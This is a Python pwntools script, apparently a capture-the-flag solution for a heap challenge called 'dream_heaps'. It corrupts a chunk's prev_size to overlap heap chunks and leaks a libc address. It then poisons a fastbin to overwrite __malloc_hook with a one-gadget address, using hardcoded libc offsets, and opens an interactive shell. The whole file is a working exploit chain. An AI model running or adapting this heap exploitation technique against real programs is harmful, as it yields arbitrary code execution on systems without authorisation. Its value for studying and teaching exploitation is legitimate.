from pwn import *

#context.log_level = "DEBUG"
#context.terminal = ['tmux', 'splitw', '-h']

#target = process("./dream_heaps")
target = remote("localhost", 1070)
#gdb.attach(target)
#raw_input()

def new_chunk(length, data):
    target.recvuntil("Quit\n")
    target.sendline("1")
    target.recvuntil("dream?")
    target.sendline(str(length))
    target.recvuntil("dream?")
    target.sendline(data)

def view(index):
    target.recvuntil("Quit\n")
    target.sendline("2")
    target.recvuntil("read?")
    target.sendline(str(index))

def edit_chunk(index, data):
    target.recvuntil("Quit\n")
    target.sendline("3")
    target.recvuntil("change?")
    target.sendline(str(index))
    target.sendline(data)

def free_chunk(index):
    target.recvuntil("Quit\n")
    target.sendline("4")
    target.recvuntil("delete?")
    target.sendline(str(index))

new_chunk(0xf8, "A"*0xf8)   # 0
new_chunk(0x68, "B"*0x68)   # 1   (originally size 0x58, had to increase to match future malloc_hook chunk
new_chunk(0xf8, "C"*0xf8)   # 2
new_chunk(0x8, "D"*0x8)     # 3  (padding against the forest, don't allow reintegration)

free_chunk(0)
edit_chunk(1, "E"*0x60 + p64(0x170))
free_chunk(2)    # Abusee corrupted prev_size
new_chunk(0xf8, "F"*0xf8)   # 4, pushes libc ptrs to beginning of chunk 1. Fix next size
view(1)
target.recvline()
leak = u64(target.recv(6) + "\x00\x00")
libc = leak - 0x3c4b78
malloc_chunk = libc + 0x3c4b10 - 0x23
gadget = libc + 0xf1147 
log.info("Leak found: " + hex(leak))
log.info("Libc base: " + hex(libc))

free_chunk(4)
new_chunk(0x100, "G"*0xf8 + p64(0x70))    # 5
free_chunk(1)  # added to fastbin, ready pointer corruption for rip
free_chunk(5)
new_chunk(0x108, "H"*0xf8 + p64(0x70) + p64(malloc_chunk))   # 6
new_chunk(0x68, "I"*0x68)     # 7:
new_chunk(0x68, "J"*0x13 + p64(gadget))

target.recvuntil("Quit\n")
#raw_input()
target.sendline("1")
target.recvuntil("dream?")
target.sendline("1337")

target.interactive()
